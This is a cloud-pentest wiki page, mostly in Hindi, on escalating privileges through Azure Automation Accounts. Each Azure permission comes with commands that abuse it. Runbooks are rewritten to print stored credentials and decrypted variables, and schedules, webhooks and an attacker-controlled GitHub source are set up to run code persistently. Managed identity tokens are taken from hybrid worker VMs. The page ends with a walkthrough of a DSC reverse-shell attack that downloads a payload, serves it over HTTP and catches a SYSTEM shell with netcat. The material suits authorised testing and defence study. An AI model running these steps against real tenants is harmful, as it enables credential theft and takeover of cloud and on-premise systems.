# Az - Azure Automation Accounts Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Automation Accounts

अधिक जानकारी के लिए देखें:

{{#ref}}
../az-services/az-automation-accounts.md
{{#endref}}

### Hybrid Workers Group

- **From the Automation Account to the VM**

याद रखें कि यदि किसी तरह कोई attacker किसी hybrid worker में arbitrary runbook (arbitrary code) को execute कर सके, तो वह **VM के स्थान पर pivot कर जाएगा**। यह किसी on-premise मशीन, किसी दूसरे cloud का VPC या यहाँ तक कि एक Azure VM भी हो सकता है।

इसके अलावा, यदि hybrid worker Azure में चल रहा है और उसके साथ अन्य Managed Identities attached हैं, तो runbook **managed identity of the runbook और VM की सभी managed identities को metadata service से access कर सकेगा**।

> [!TIP]
> ध्यान रखें कि **metadata service** का अलग URL है (**`http://169.254.169.254`**) और यह उस service से अलग है जहाँ से automation account के managed identities token (**`IDENTITY_ENDPOINT`**) मिलते हैं।

- **From the VM to the Automation Account**

इसके अलावा, यदि कोई व्यक्ति उस VM को compromise कर ले जहां एक automation account script चल रही है, तो वह **Automation Account** के metadata को locate कर सकता है और VM से access करके Automation Account से attached **Managed Identities** के tokens प्राप्त कर सकता है।

जैसा कि नीचे की इमेज में देखा जा सकता है, VM पर Administrator access होने पर process के **environment variables** में automation account metadata service को access करने के लिए URL और secret पाया जा सकता है:

![](</images/vm_to_aa.jpg>)


### `Microsoft.Automation/automationAccounts/jobs/write`, `Microsoft.Automation/automationAccounts/runbooks/draft/write`, `Microsoft.Automation/automationAccounts/jobs/output/read`, `Microsoft.Automation/automationAccounts/runbooks/publish/action` (`Microsoft.Resources/subscriptions/resourcegroups/read`, `Microsoft.Automation/automationAccounts/runbooks/write`)

संक्षेप में ये permissions Automation Account में **Runbooks को create, modify और run करने** की अनुमति देती हैं, जिनका उपयोग आप Automation Account के context में **code execute** करने के लिए कर सकते हैं और assigned **Managed Identities** पर privileges escalate करके Automation Account में stored **credentials** और **encrypted variables** को leak कर सकते हैं।

permission **`Microsoft.Automation/automationAccounts/runbooks/draft/write`** आपको Automation Account में किसी Runbook के कोड को modify करने की अनुमति देता है, इसका उपयोग करके:
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content '$creds = Get-AutomationPSCredential -Name "<credential-name>"
$runbook_variable = Get-AutomationVariable -Name "<encrypted-variable-name>"
$runbook_variable
$creds.GetNetworkCredential().username
$creds.GetNetworkCredential().password'
```
ध्यान दें कि पिछले स्क्रिप्ट का उपयोग credential के **leak the useranmd and password** और Automation Account में संग्रहित एक **encrypted variable** के मान को प्राप्त करने के लिए किया जा सकता है।

अनुमति **`Microsoft.Automation/automationAccounts/runbooks/publish/action`** उपयोगकर्ता को Automation Account में Runbook प्रकाशित करने की अनुमति देती है ताकि परिवर्तन लागू हो सकें:
```bash
az automation runbook publish \
--resource-group <res-group> \
--automation-account-name <account-name> \
--name <runbook-name>
```
अनुमति **`Microsoft.Automation/automationAccounts/jobs/write`** उपयोगकर्ता को Automation Account में Runbook चलाने की अनुमति देती है:
```bash
az automation runbook start \
--automation-account-name <account-name> \
--resource-group <res-group> \
--name <runbook-name> \
[--run-on <name-hybrid-group>]
```
अनुमति **`Microsoft.Automation/automationAccounts/jobs/output/read`** उपयोगकर्ता को Automation Account में किसी job का आउटपुट पढ़ने की अनुमति देती है, उपयोग करके:
```bash
az rest --method GET \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/jobs/<job-name>/output?api-version=2023-11-01"
```
यदि Runbooks बनाए नहीं गए हैं, या आप एक नया बनाना चाहते हैं, तो इसे करने के लिए आपको **अनुमतियाँ `Microsoft.Resources/subscriptions/resourcegroups/read` और `Microsoft.Automation/automationAccounts/runbooks/write`** की आवश्यकता होगी:
```bash
az automation runbook create --automation-account-name <account-name> --resource-group <res-group> --name <runbook-name> --type PowerShell
```
### `Microsoft.Automation/automationAccounts/write`, `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`

यह अनुमति उपयोगकर्ता को निम्न का उपयोग करके Automation Account पर **user managed identity असाइन करने** की अनुमति देती है:
```bash
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>?api-version=2020-01-13-preview" \
--headers "Content-Type=application/json" \
--body '{
"identity": {
"type": "UserAssigned",
"userAssignedIdentities": {
"/subscriptions/<subscripntion-id>/resourceGroups/<res-group>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<user-managed-identity-name>": {}
}
}
}'
```
### `Microsoft.Automation/automationAccounts/schedules/write`, `Microsoft.Automation/automationAccounts/jobSchedules/write`

अनुमति **`Microsoft.Automation/automationAccounts/schedules/write`** होने पर Automation Account में एक नया Schedule बनाया जा सकता है जो निम्नलिखित कमांड का उपयोग करके हर 15 मिनट पर चलाया जाता है (not very stealth)।

ध्यान दें कि **किसी Schedule का न्यूनतम अंतराल 15 मिनट है**, और **न्यूनतम प्रारंभ समय भविष्य में 5 मिनट** होना चाहिए।
```bash
## For linux
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every minute" \
--start-time "$(date -u -d "7 minutes" +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15

## Form macOS
az automation schedule create \
--resource-group <RESOURCE_GROUP> \
--automation-account-name <AUTOMATION_ACCOUNT_NAME> \
--name <SCHEDULE_NAME> \
--description "Triggers runbook every 15 minutes" \
--start-time "$(date -u -v+7M +%Y-%m-%dT%H:%M:%SZ)" \
--frequency Minute \
--interval 15
```
फिर, अनुमति **`Microsoft.Automation/automationAccounts/jobSchedules/write`** के साथ, निम्न का उपयोग करके एक Scheduler को runbook पर असाइन करना संभव है:
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-accounts>/jobSchedules/b510808a-8fdc-4509-a115-12cfc3a2ad0d?api-version=2015-10-31" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"runOn": "",
"runbook": {
"name": "<runbook-name>"
},
"schedule": {
"name": "<scheduler-name>>"
},
"parameters": {}
}
}'
```
> [!TIP]
> पिछले उदाहरण में jobchedule id को **`b510808a-8fdc-4509-a115-12cfc3a2ad0d` as exmple** के रूप में छोड़ा गया था, लेकिन इस असाइनमेंट को बनाने के लिए आपको एक मनमाना मान उपयोग करना होगा।

### `Microsoft.Automation/automationAccounts/webhooks/write`

इस अनुमति **`Microsoft.Automation/automationAccounts/webhooks/write`** के साथ आप निम्नलिखित कमांडों में से किसी एक का उपयोग करके किसी Automation Account के अंदर किसी Runbook के लिए नया Webhook बना सकते हैं।

Azure Powershell का उपयोग करके:
```bash
New-AzAutomationWebHook -Name <webhook-name> -ResourceGroupName <res-group> -AutomationAccountName <automation-account-name> -RunbookName <runbook-name> -IsEnabled $true
```
AzureCLI और REST के साथ:
```bash
az rest --method put \
--uri "https://management.azure.com/subscriptions/<subscriptionID>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/webhooks/<webhook-name>?api-version=2015-10-31" \
--body '{
"name": "<webhook-name>",
"properties": {
"isEnabled": true,
"expiryTime": "2027-12-31T23:59:59+00:00",
"runOn": "<worker name>",
"runbook": {
"name": "<runbook-name>"
}
}
}'
```
ये commands एक webhook URI वापस करेंगे जो केवल बनाए जाने पर दिखता है। फिर, webhook URI का उपयोग करके runbook को कॉल करने के लिए
```bash
curl -X POST "https://f931b47b-18c8-45a2-9d6d-0211545d8c02.webhook.eus.azure-automation.net/webhooks?token=Ts5WmbKk0zcuA8PEUD4pr%2f6SM0NWydiCDqCqS1IdzIU%3d" \
-H "Content-Length: 0"
```
### `Microsoft.Automation/automationAccounts/runbooks/draft/write`

केवल अनुमति `Microsoft.Automation/automationAccounts/runbooks/draft/write` होने पर बिना प्रकाशित किए **Runbook का कोड अपडेट करना** और उसे निम्नलिखित कमांड्स का उपयोग करके चलाना संभव है।
```bash
# Update the runbook content with the provided PowerShell script
az automation runbook replace-content --no-wait \
--resource-group Resource_Group_1 \
--automation-account-name autoaccount1 \
--name AzureAutomationTutorialWithIdentity \
--content 'echo "Hello World"'

# Run the unpublished code
## Indicate the name of the hybrid worker group in runOn to execute the runbook there
az rest \
--method PUT \
--url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob?api-version=2023-05-15-preview" \
--headers "Content-Type=application/json" \
--body '{
"parameters": {},
"runOn": "",
"runtimeEnvironment": "PowerShell-5.1"
}'

# Get the output (a different permission is needed here, but you could get a revershell or exfiltrate the token to avoid needing this permission)
az rest --method get --url "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Automation/automationAccounts/autoaccount1/runbooks/AzureAutomationTutorialWithIdentity/draft/testJob/streams?api-version=2019-06-01"
```
### `Microsoft.Automation/automationAccounts/sourceControls/write`, (`Microsoft.Automation/automationAccounts/sourceControls/read`)

यह अनुमति उपयोगकर्ता को Automation Account के लिए **source control को कॉन्फ़िगर करने** की अनुमति देती है, निम्नलिखित commands का उपयोग करके (यह Github का उदाहरण है):
```bash
az automation source-control create \
--resource-group <res-group> \
--automation-account-name <automation-account-name> \
--name RemoteGithub \
--repo-url https://github.com/carlospolop/gh-runbooks.git \
--branch main \
--folder-path /runbooks/ \
--publish-runbook true \
--auto-sync \
--source-type GitHub \
--token-type PersonalAccessToken \
--access-token github_pat_11AEDCVZ<rest-of-the-token>
```
यह Github repository से runbooks को Automation Account में स्वचालित रूप से import कर देगा और उन्हें चलाने की कुछ अन्य permissions मिलने पर यह **possible to escalate privileges** हो सकता है।

इसके अलावा, याद रखें कि source control के लिए Automation Accounts में काम करने हेतु इसमें एक managed identity होनी चाहिए जिसका role **`Contributor`** हो, और अगर यह एक user managed identity है तो MI का client id वेरिएबल **`AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID`** में specify करना होगा।

> [!TIP]
> ध्यान दें कि एक बार source control बनाने के बाद उसके repo URL को बदलना संभव नहीं है।

### `Microsoft.Automation/automationAccounts/variables/write`

permission **`Microsoft.Automation/automationAccounts/variables/write`** से Automation Account में variables लिखना निम्नलिखित command का उपयोग करके संभव है।
```bash
az rest --method PUT \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Automation/automationAccounts/<automation-account-name>/variables/<variable-name>?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body '{
"name": "<variable-name>",
"properties": {
"description": "",
"value": "\"<variable-value>\"",
"isEncrypted": false
}
}'
```
### कस्टम रनटाइम एन्वायरनमेंट्स

यदि कोई automation account किसी कस्टम runtime environment का उपयोग कर रहा है, तो runtime के किसी कस्टम पैकेज को कुछ malicious code (जैसे **a backdoor**) से overwrite करना संभव हो सकता है। इस तरह, जब भी उस custom runtime का उपयोग करने वाला runbook execute होगा और custom package को load करेगा, तो malicious code execute हो जाएगा।

### State Configuration से समझौता

**पूर्ण पोस्ट देखें:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

- Step 1 — फ़ाइलें बनाना

**आवश्यक फ़ाइलें:** दो PowerShell स्क्रिप्ट आवश्यक हैं:
1. `reverse_shell_config.ps1`: एक Desired State Configuration (DSC) फ़ाइल जो payload को fetch कर के execute करती है। इसे [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) से प्राप्त किया जा सकता है।
2. `push_reverse_shell_config.ps1`: कॉन्फ़िगरेशन को VM पर publish करने के लिए एक स्क्रिप्ट, उपलब्ध है [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) पर।

**कस्टमाइज़ेशन:** इन फ़ाइलों में मौजूद variables और parameters को उपयोगकर्ता के specific environment के अनुसार अनुकूलित करना होगा, जिसमें resource names, file paths, और server/payload identifiers शामिल हैं।

- Step 2 — कॉन्फ़िगरेशन फ़ाइल को Zip करना

`reverse_shell_config.ps1` को एक `.zip` फ़ाइल में compress किया जाता है, ताकि इसे Azure Storage Account पर transfer करने के लिए तैयार किया जा सके।
```bash
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
- चरण 3 — स्टोरेज संदर्भ सेट करें और अपलोड

ज़िप की गई कॉन्फ़िगरेशन फ़ाइल को पहले से परिभाषित Azure Storage कंटेनर, azure-pentest, में Azure के Set-AzStorageBlobContent cmdlet का उपयोग करके अपलोड किया जाता है।
```bash
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
- चरण 4 — Kali Box की तैयारी

Kali सर्वर RevPS.ps1 payload को एक GitHub repository से डाउनलोड करता है।
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
स्क्रिप्ट को लक्षित Windows VM और reverse shell के लिए पोर्ट निर्दिष्ट करने हेतु संपादित किया गया है।

- Step 5 — कॉन्फ़िगरेशन फ़ाइल प्रकाशित करें

कॉन्फ़िगरेशन फ़ाइल निष्पादित की जाती है, जिससे reverse-shell स्क्रिप्ट Windows VM पर निर्दिष्ट स्थान पर तैनात हो जाती है।

- Step 6 — Payload होस्ट करें और Listener सेटअप करें

Payload होस्ट करने के लिए एक Python SimpleHTTPServer शुरू किया जाता है, साथ ही आने वाले कनेक्शनों को पकड़ने के लिए एक Netcat listener भी सेट किया जाता है।
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
यह scheduled task payload को चलाता है, जिससे SYSTEM-level privileges प्राप्त होते हैं।

{{#include ../../../banners/hacktricks-training.md}}
